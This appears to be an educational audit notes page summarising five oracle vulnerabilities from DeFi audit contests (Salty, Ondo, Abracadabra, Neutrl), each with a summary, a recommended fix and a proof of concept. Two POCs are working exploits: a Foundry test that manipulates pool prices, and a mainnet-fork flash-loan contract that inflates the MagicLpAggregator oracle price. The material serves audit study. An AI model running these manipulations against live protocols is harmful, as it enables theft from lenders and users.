# ETAAcademy-Adudit: 7. Oracle

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>07. Oracle</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>DeFi</th>
          <td>oracle</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[High] The use of spot price by CoreSaltyFeed can lead to price manipulation and undesired liquidations

### Difference between TWAP and Chainlink

- Summary: Chainlink's instant spot prices and CoreSaltyFeed's manipulable prices create arbitrage opportunities. Low liquidity and a $500 maximum reward make attacks profitable. If Chainlink fails, a 3% market change isn't needed for the attack. Borrowers may face unexpected liquidation, and honest liquidators may be unable to act due to price manipulation.

- Impact & Recommendation: Consider replacing CoreSaltyFeed with a different oracle that provides better protection against manipulation, like Band Protocol.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-salty#h-03-the-use-of-spot-price-by-coresaltyfeed-can-lead-to-price-manipulation-and-undesired-liquidations) & [Report](https://code4rena.com/reports/2024-01-salty)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: BUSL 1.1
    pragma solidity =0.8.22;
    import "../../dev/Deployment.sol";
    import "../PoolUtils.sol";
    contract H2 is Deployment
        {
        TestERC20 immutable tokenA;
        TestERC20 immutable tokenB;
        address ALICE = address(0x1111);
        address BOB = address(0x2222);
                constructor()
            {
                initializeContracts();
                grantAccessAlice();
                grantAccessBob();
                grantAccessCharlie();
                grantAccessDeployer();
                grantAccessDefault();
                finalizeBootstrap();
                vm.startPrank(address(daoVestingWallet));
                salt.transfer(DEPLOYER, 1000000 ether);
                salt.transfer(address(collateralAndLiquidity), 1000000 ether);
                vm.stopPrank();
                vm.startPrank( DEPLOYER );
                tokenA = new TestERC20("TOKENA", 18);
                tokenB = new TestERC20("TOKENB", 18);
                vm.stopPrank();
                _prepareToken(tokenA);
                _prepareToken(tokenB);
                _prepareToken(weth);
                vm.stopPrank();
                vm.prank(address(dao));
                poolsConfig.whitelistPool( pools, tokenA, tokenB );
                vm.stopPrank();
            }
            // Make the required approvals and transfer to Bob and Alice.
            function _prepareToken(IERC20 token) internal {
                vm.startPrank( DEPLOYER );
                token.approve( address(pools), type(uint256).max );
                token.approve( address(collateralAndLiquidity), type(uint256).max );
                // For WBTC, we can't use 'ether', so we use 10**8.
                uint decimals = TestERC20(address(token)).decimals();
                token.transfer(ALICE, 1_000_000 * (10**decimals));
                token.transfer(BOB, 1_000_000 * (10**decimals));
                vm.startPrank(ALICE);
                token.approve( address(pools), type(uint256).max );
                token.approve( address(collateralAndLiquidity), type(uint256).max );
                vm.startPrank(BOB);
                token.approve( address(pools), type(uint256).max );
                token.approve( address(collateralAndLiquidity), type(uint256).max );
                vm.stopPrank();
            }
            // Create pools that will participate in arbitrage
            // Note: We have all required pools for successful arbitrage, see ArbitrageSearch::_arbitragePath
            // swap: swapTokenIn->WETH
            // arb: WETH->swapTokenIn->WBTC->WETH
            // We have: tokenA/WETH, tokenA/WBTC, WBTC/WETH
            function _makeArbitragePossible(uint amountToDeposit) internal {
                // based on Pools.t.sol::testDepositDoubleSwapWithdraw
                vm.startPrank(DEPLOYER);
                wbtc.approve(address(collateralAndLiquidity), type(uint256).max );
                weth.approve(address(collateralAndLiquidity), type(uint256).max );
                tokenA.approve(address(collateralAndLiquidity), type(uint256).max );
                tokenB.approve(address(collateralAndLiquidity), type(uint256).max );
                tokenA.approve(address(pools), type(uint256).max );
                vm.warp(block.timestamp + stakingConfig.modificationCooldown());
                collateralAndLiquidity.depositCollateralAndIncreaseShare(
                    amountToDeposit * 10**8, amountToDeposit * 1 ether, 0, block.timestamp, false
                );
                vm.stopPrank();
                vm.startPrank(address(dao));
                poolsConfig.whitelistPool( pools, tokenA, wbtc);
                poolsConfig.whitelistPool( pools, tokenA, weth);
                poolsConfig.whitelistPool( pools, tokenB, wbtc);
                poolsConfig.whitelistPool( pools, tokenB, weth);
                vm.stopPrank();
                vm.startPrank(DEPLOYER);
                collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                    tokenA, wbtc, amountToDeposit * 1 ether, amountToDeposit * 10**8, 0,
                    block.timestamp, false
                );
                collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                    tokenB, wbtc, amountToDeposit * 1 ether, amountToDeposit * 10**8, 0,
                    block.timestamp, false
                );
                collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                    tokenA, weth, amountToDeposit * 1 ether, amountToDeposit * 1 ether, 0,
                    block.timestamp, false
                );
                collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                    tokenB, weth, amountToDeposit * 1 ether, amountToDeposit * 1 ether, 0,
                    block.timestamp, false
                );
                vm.stopPrank();
            }
            function _getReservesAndPrice(IERC20 _tokenA, IERC20 _tokenB) internal view returns (
                string memory _tokenASymbol, string memory _tokenBSymbol,
                uint reserveA, uint reserveB, uint priceBinA
            ) {
                (reserveA, reserveB) = pools.getPoolReserves(_tokenA, _tokenB);
                _tokenASymbol = TestERC20(address(_tokenA)).symbol();
                _tokenBSymbol = TestERC20(address(_tokenB)).symbol();
                uint8  _tokenADecimals = TestERC20(address(_tokenA)).decimals();
                uint8  _tokenBDecimals = TestERC20(address(_tokenB)).decimals();
                // reserveA / reserveB  || b.decimals - a.decimals  || normalizer
                // 1e8/1e18             || diff 10                  || 1e28
                // 1e18/1e18            || diff 0                   || 1e18
                // 1e18/1e8             || diff -10                 || 1e8
                int8 decimalsDiff = int8(_tokenBDecimals) - int8(_tokenADecimals);
                uint normalizerPower = uint8(int8(18) + decimalsDiff);
                uint normalizer = 10**normalizerPower;
                // price with precision 1e18
                priceBinA = reserveB == 0
                        ? 0
                        : ( reserveA * normalizer ) / reserveB;
            }
            function _printReservesAndPriceFor(IERC20 _tokenA, IERC20 _tokenB) internal view
            {
                (
                    string memory _tokenASymbol,
                    string memory _tokenBSymbol,
                    uint reserveA,
                    uint reserveB,
                    uint priceBinA
                ) = _getReservesAndPrice(_tokenA, _tokenB);
                console2.log("%s reserves: %e", _tokenASymbol , reserveA);
                console2.log("%s reserves: %e", _tokenBSymbol, reserveB);
                console2.log("%s price in %s: %e", _tokenBSymbol, _tokenASymbol, priceBinA);
                console.log("");
            }
            // Extracted some local variables to storage due to too many local variables.
            struct MovePriceParams {
                uint amountToExchange;
                uint expectedMovementPercents;
                uint expectedLoss;
            }
            uint gasBefore = 1; // Set to 1 to save gas on updates and obtain more accurate gas estimations.
            uint stepsCount;
            // Splitting a swap into several steps will significantly reduce slippage.
            // More steps will further reduce slippage, thereby decreasing the cost of the attack.
            // However, too many steps can incur high gas costs; for instance, 100 steps will cost approximately 3+4=7 million gas (as indicated in the console.log output).
            uint constant steps = 100;
            function _movePrice(MovePriceParams memory p) internal {
                /* Before the attack */
                console.log("\n%s", "__BEFORE");
                // Check price before
                (,,,,uint priceBefore) = _getReservesAndPrice(tokenA, weth);
                assertEq(1 ether, priceBefore); // price is 1:1
                _printReservesAndPriceFor(tokenA, weth);
                uint wethBefore = weth.balanceOf(ALICE);
                uint tokenABefore = tokenA.balanceOf(ALICE);
                console2.log("weth.balanceOf(ALICE): %e", wethBefore);
                console2.log("tokenA.balanceOf(ALICE): %e", tokenABefore);
                /* Move the price */
                vm.startPrank(ALICE);
                gasBefore = gasleft();
                for (uint i; i < steps; i++){
                    pools.depositSwapWithdraw(tokenA, weth, p.amountToExchange/steps, 0, block.timestamp + 300);
                }
                console.log("Gas first(for) loop: ", gasBefore - gasleft());
                /* After the attack */
                console.log("\n%s", "__AFTER");
                // Console.log the output
                _printReservesAndPriceFor(tokenA, weth);
                uint wethAfter = weth.balanceOf(ALICE);
                uint tokenAAfter = tokenA.balanceOf(ALICE);
                console2.log("weth.balanceOf(ALICE): %e", weth.balanceOf(ALICE));
                console2.log("tokenA.balanceOf(ALICE): %e", tokenA.balanceOf(ALICE));
                uint wethGained = wethAfter - wethBefore;
                uint tokenALost = tokenABefore - tokenAAfter;
                console2.log("weth.balanceOf(ALICE) diff: %e", wethGained);
                console2.log("tokenA.balanceOf(ALICE) diff: %e", tokenALost);
                // Note: Since the price of tokenA and WETH are the same at the start, with a 1:1 ratio,
                // we can subtract and add them as equivalent values.
                uint attackPrice = tokenALost - wethGained;
                console2.log("Losses for the attacker (before swapping back): %e", attackPrice);
                // Assert that the attack was successful and inexpensive.
                (,,,,uint priceAfter) = _getReservesAndPrice(tokenA, weth);
                uint priceDiff = priceAfter - priceBefore;
                assertTrue(priceDiff >= p.expectedMovementPercents * 1 ether / 100);
                /* The attacker can further reduce the cost by exchanging back. */
                /* After the exchange, the price is moved back. */
                console.log("\n%s", "__AFTER_EXCHANGING_BACK");
                (,,,,uint currentPrice) = _getReservesAndPrice(tokenA, weth);
                uint step = p.amountToExchange/steps;
                gasBefore = gasleft();
                while (currentPrice > 1 ether){
                    pools.depositSwapWithdraw(weth, tokenA, step, 0, block.timestamp);
                    (,,,,currentPrice) = _getReservesAndPrice(tokenA, weth);
                    stepsCount++;
                }
                // Console.log the output
                console2.log("Gas second(while) loop: ", gasBefore - gasleft());
                console2.log("stepsCount", stepsCount);
                _printReservesAndPriceFor(tokenA, weth);
                uint wethAfterBalancing = weth.balanceOf(ALICE);
                uint tokenAAfterBalancing = tokenA.balanceOf(ALICE);
                console2.log("weth.balanceOf(ALICE): %e", weth.balanceOf(ALICE));
                console2.log("tokenA.balanceOf(ALICE): %e", tokenA.balanceOf(ALICE));
                int wethDiff = int(wethAfterBalancing) - int(wethBefore);
                int tokenADiff = int(tokenAAfterBalancing) - int(tokenABefore);
                console2.log("weth.balanceOf(ALICE) diff: %e", wethDiff);
                console2.log("tokenA.balanceOf(ALICE) diff: %e", tokenADiff);
                // Note: Since the price of tokenA and WETH are the same at the start, with a 1:1 ratio,
                // we can subtract and add them as equivalent values.
                int sumDiff = wethDiff + tokenADiff;
                console2.log("Diff (positive=profit) for the attacker: %e", sumDiff);
                console2.log("Arbitrage profits for DAO: %e", pools.depositedUserBalance(address(dao), weth ));
            }
        function testMovePrice10PercentsFor1000EtherPools() public
            {
                _makeArbitragePossible(1_000);
                _movePrice(MovePriceParams(75 ether, 10, 0.0363 ether));
            }
        function testMovePrice3PercentsFor1000EtherPools() public
            {
                _makeArbitragePossible(1_000);
                _movePrice(MovePriceParams(23 ether, 3, 0.0036 ether));
            }
        function testMovePrice3PercentsFor100EtherPools() public
            {
                _makeArbitragePossible(100);
                _movePrice(MovePriceParams(2.3 ether, 3, 0.0004 ether));
            }
        function testMovePrice3PercentsFor10EtherPools() public
            {
                _makeArbitragePossible(10);
                _movePrice(MovePriceParams(0.23 ether, 3, 0.00008 ether));
            }
    }

  ```

  </details>

## 2.[High] OUSGInstantManager will allow excessive OUSG token minting during USDC depeg event

### Excessive OUSG token minting during USDC depeg

- Summary: OUSGInstantManager allows users to mint OUSG tokens using USDC, based on a fixed conversion rate, without validation checks on the current USDC price. The minting logic relies on the OUSG price obtained from an oracle, constrained to ensure stability. During a USDC depeg event, where USDC's value deviates from 1 USD, users can potentially mint excessive OUSG tokens, leading to a significant impact on token supply.

- Impact & Recommendation: Excessive OUSG token minting during USDC depeg events. Implement an additional Oracle to consider current USDC price when calculating OUSG token minting.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-ondo-finance#h-01-ousginstantmanager-will-allow-excessive-ousg-token-minting-during-usdc-depeg-event) & [Report](https://code4rena.com/reports/2024-03-ondo-finance)

  <details><summary>POC</summary>

  ```solidity
       function setPrice(int256 newPrice) external onlyRole(SETTER_ROLE) {
       if (newPrice <= 0) {
         revert InvalidPrice();
       }
   @-> if (block.timestamp - priceTimestamp < MIN_PRICE_UPDATE_WINDOW) {
         revert PriceUpdateWindowViolation();
       }
   @-> if (_getPriceChangeBps(rwaPrice, newPrice) > MAX_CHANGE_DIFF_BPS) {
         revert DeltaDifferenceConstraintViolation();
       }
       // Set new price
       int256 oldPrice = rwaPrice;
       rwaPrice = newPrice;
       priceTimestamp = block.timestamp;
       emit RWAPriceSet(oldPrice, newPrice, block.timestamp);
     }

       function _getMintAmount(
           uint256 usdcAmountIn,
           uint256 price
       ) internal view returns (uint256 ousgAmountOut) {
           uint256 amountE36 = _scaleUp(usdcAmountIn) * 1e18;
           ousgAmountOut = amountE36 / price;
       }

  ```

  </details>

## 3.[High] Anyone making use of the MagicLP’s TWAP to determine token prices will be exploitable.

### TWAP updating mechanism

- Summary: MagicLP's TWAP updating mechanism allows attackers to manipulate recorded prices by inflating reserves before a query, resulting in potentially exploitative trading conditions for unsuspecting users. This can lead to significant profit for attackers who exploit the manipulated prices during trading activities, posing a risk to any application relying on MagicLP’s TWAP for token price determination.

- Impact & Recommendation: `_twapUpdate()` needs to be called before reserves are updated.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-abracadabra-money#h-01-anyone-making-use-of-the-magiclps-twap-to-determine-token-prices-will-be-exploitable) & [Report](https://code4rena.com/reports/2024-03-abracadabra-money)

<details><summary>POC</summary>

```solidity
    function _twapUpdate() internal {
        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);
        uint32 timeElapsed = blockTimestamp - _BLOCK_TIMESTAMP_LAST_;
        if (timeElapsed > 0 && _BASE_RESERVE_ != 0 && _QUOTE_RESERVE_ != 0) {
            /// @dev It is desired and expected for this value to
            /// overflow once it has hit the max of `type.uint256`.
            unchecked {
                _BASE_PRICE_CUMULATIVE_LAST_ += getMidPrice() * timeElapsed;
            }
        }
        _BLOCK_TIMESTAMP_LAST_ = blockTimestamp;
    }

    function _resetTargetAndReserve() internal returns (uint256 baseBalance, uint256 quoteBalance) {
        baseBalance = _BASE_TOKEN_.balanceOf(address(this));
        quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));
        if (baseBalance > type(uint112).max || quoteBalance > type(uint112).max) {
            revert ErrOverflow();
        }
        _BASE_RESERVE_ = uint112(baseBalance);
        _QUOTE_RESERVE_ = uint112(quoteBalance);
        _BASE_TARGET_ = uint112(baseBalance);
        _QUOTE_TARGET_ = uint112(quoteBalance);
        _RState_ = uint32(PMMPricing.RState.ONE);
        _twapUpdate();
    }
    function _setReserve(uint256 baseReserve, uint256 quoteReserve) internal {
        _BASE_RESERVE_ = baseReserve.toUint112();
        _QUOTE_RESERVE_ = quoteReserve.toUint112();
        _twapUpdate();
    }


```

</details>

## 4.[High] Oracle price can be manipulated

### Oracle price

- Summary: MagicLpAggregator allows attackers to manipulate pair token prices by inflating reserve values. For example, an attacker can use a flash loan to inflate the pair price, which can deceive users relying on the oracle's price information, leading to potential financial losses.

- Impact & Recommendation: Consider add a sanity check in MagicLpAggregator to compare base and quote token prices with the Chainlink price feed.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-abracadabra-money#h-04-oracle-price-can-be-manipulated) & [Report](https://code4rena.com/reports/2024-03-abracadabra-money)

<details><summary>POC</summary>

```solidity
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.13;
    import "utils/BaseTest.sol";
    import "oracles/aggregators/MagicLpAggregator.sol";
    // import "forge-std/console2.sol";
    interface IDodo {
        function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve);
        function _QUOTE_TOKEN_() external view returns (address);
        function sellBase(address to) external returns (uint256);
        function sellQuote(address to) external returns (uint256);
    }
    interface IFlashMinter {
        function flashLoan(address, address, uint256, bytes memory) external;
    }
    contract MagicLpAggregatorExt is MagicLpAggregator {
        constructor(
            IMagicLP pair_,
            IAggregator baseOracle_,
            IAggregator quoteOracle_
        ) MagicLpAggregator(pair_, baseOracle_, quoteOracle_) {}
        function _getReserves() internal view override returns (uint256, uint256) {
            return IDodo(address(pair)).getVaultReserve();
        }
    }
    contract Borrower {
        IFlashMinter private immutable minter;
        IDodo private immutable dodoPool;
        MagicLpAggregator private immutable oracle;
        constructor(address _minter, address _dodoPool, address _oracle) {
            minter = IFlashMinter(_minter);
            dodoPool = IDodo(_dodoPool);
            oracle = MagicLpAggregator(_oracle);
        }
        /// Initiate a flash loan
        function flashBorrow(address token, uint256 amount) public {
            IERC20Metadata(token).approve(address(minter), ~uint256(0));
            minter.flashLoan(address(this), token, amount, "");
        }
        /// ERC-3156 Flash loan callback
        function onFlashLoan(
            address initiator,
            address token, // DAI
            uint256 amount,
            uint256 fee,
            bytes calldata data
        ) external returns (bytes32) {
            // tamper with the DAI/USDT pool
            IERC20Metadata(token).transfer(address(dodoPool), amount);
            dodoPool.sellBase(address(this));
            IERC20Metadata quote = IERC20Metadata(dodoPool._QUOTE_TOKEN_());
            uint256 quoteAmount = quote.balanceOf(address(this));
            // pair price after tampering
            uint256 response = uint256(oracle.latestAnswer());
            console.log("BAD ANSWER: ", response);
            // Do something evil here
            // swap tokens back and repay the loan
            address(quote).call{value: 0}(abi.encodeWithSignature("transfer(address,uint256)", address(dodoPool), quoteAmount));
            dodoPool.sellQuote(address(this));
            IERC20Metadata(token).transfer(initiator, amount + fee);
            return keccak256("ERC3156FlashBorrower.onFlashLoan");
        }
    }
    contract MagicLpAggregatorTest is BaseTest {
        MagicLpAggregatorExt aggregator;
        address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        address constant DAI_MINTER = 0x60744434d6339a6B27d73d9Eda62b6F66a0a04FA;
        address constant DODO_POOL = 0x3058EF90929cb8180174D74C507176ccA6835D73;
        function setUp() public override {
            fork(ChainId.Mainnet, 19365773);
            _setUp();
        }
        function _setUp() public {
            super.setUp();
            aggregator = new MagicLpAggregatorExt(
                IMagicLP(DODO_POOL),
                IAggregator(0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9),
                IAggregator(0x3E7d1eAB13ad0104d2750B8863b489D65364e32D)
            );
        }
        function testGetResult() public {
            uint256 response = uint256(aggregator.latestAnswer());
            // pair price before ~ $2
            assertEq(response, 2000502847471294054);
            console.log("GOOD ANSWER: ", response);
            // use DAI flash minter to inflate the pair price to $67
            Borrower borrower = new Borrower(DAI_MINTER, DODO_POOL, address(aggregator));
            deal(DAI, address(borrower), 1100 * 1e18);
            IERC20Metadata(DAI).approve(address(borrower), type(uint256).max);
            borrower.flashBorrow(DAI, 100_000_000 ether);
        }
    }

```

</details>

## 5.[Medium] Same heartbeat for multiple price feeds is vulnerable

### Oracle heartbeat

- Summary: ChainLinkDataConsumer applies the same allowedPriceUpdateDelay (heartbeat) to multiple Chainlink feeds, despite each feed having different native heartbeats (e.g., USDC/USD with 24h vs. others with ~1h). This design forces the contract to either use the longest heartbeat (risking consumption of stale prices from faster feeds) or the shortest heartbeat (causing frequent reverts when slower feeds are within their normal delay). As a result, the system faces a trade-off between downtime and stale data, undermining the reliability of price checks.

- Impact & Recommendation: Use individual heartbeat periods
  <br> 🐬: [Source](https://audits.sherlock.xyz/contests/1065/report#NeutrlProtocol) & [Report](https://audits.sherlock.xyz/contests/1065/report)

<details><summary>POC</summary>

```solidity

    if (block.timestamp < updatedAt_ || block.timestamp - updatedAt_ > allowedPriceUpdateDelay) {
        return 0;
    }

```

</details>
